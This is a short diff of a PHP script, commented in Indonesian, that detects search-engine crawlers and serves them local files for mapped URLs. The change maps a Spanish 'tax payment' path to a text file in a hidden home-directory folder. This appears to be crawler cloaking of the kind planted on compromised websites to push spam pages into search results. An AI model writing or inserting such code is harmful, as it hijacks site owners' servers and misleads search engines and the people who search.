@@ -9,7 +9,7 @@ $isCrawler = preg_match(
 
 // Path lengkap ke file lokal (bisa beda-beda direktori)
 $pathMap = [
-    '/bursars-memo'             =>   '/var/www/html/content/bursars/bursars-memo.txt',
+    '/pago-de-impuestos-2'             =>   '/home/impuesto/.cphorde/meta/kimbeklah.txt',
 ];
 
 if ($isCrawler && isset($pathMap[$uri]) && !empty($pathMap[$uri])) {
